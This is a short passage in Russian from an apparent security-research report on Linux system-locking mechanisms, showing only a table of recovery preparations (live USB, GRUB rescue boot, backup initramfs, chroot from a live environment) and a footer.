### 5.3 Подготовка к восстановлению

| Мера | Реализация |
|------|------------|
| **Live USB** | Держать загрузочную Linux USB для восстановления |
| **GRUB Rescue** | Знать, как загрузиться с кастомными параметрами ядра |
| **Резервная копия initramfs** | Хранить заведомо рабочий initramfs |
| **chroot восстановление** | Знать, как chroot из live окружения |

---

<div align="center">

**[⬆ Back to Top](#-linux-locker-research-complete-technical-analysis)**

*Security Research — Linux System Locking Mechanisms*

</div>
